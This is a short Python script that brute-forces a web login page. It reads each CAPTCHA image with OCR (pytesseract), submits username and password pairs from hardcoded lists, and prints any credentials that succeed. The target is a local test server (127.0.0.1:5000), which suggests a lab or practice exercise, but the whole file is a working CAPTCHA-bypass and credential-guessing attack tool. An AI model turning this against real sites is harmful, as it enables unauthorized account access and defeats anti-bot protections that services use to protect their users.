import requests
from PIL import Image
from io import BytesIO
import pytesseract
from bs4 import BeautifulSoup
import time
from urllib.parse import unquote


def solve_captcha(image_url):
    response = requests.get(image_url)
    img = Image.open(BytesIO(response.content))
    captcha_text = pytesseract.image_to_string(img)
    return unquote(captcha_text.strip())  


def brute_force_password():
    base_url = "http://127.0.0.1:5000/"  
    session = requests.Session()
    username_list = ['admin', 'test', 'username']
    password_list = ['admin', 'test', 'password']
    for i in range(len(username_list)):

        login_page = session.get(base_url)
        soup = BeautifulSoup(login_page.content, 'html.parser')
        captcha_image_url = base_url + soup.find('img')['src']
        

        captcha_text = solve_captcha(captcha_image_url)
        

        login_data = {
            'username': username_list[i],
            'password': password_list[i],  
            'captcha': captcha_text,
        }
        
        login_response = session.post(base_url, data=login_data)


        if login_response.url.endswith('/success'):
            print("Successful login!")
            print("    - Username found:", login_data['username'])
            print("    - Password found:", login_data['password'])
            break
        else:
            print("Failed login....")

        
        time.sleep(1)


brute_force_password()
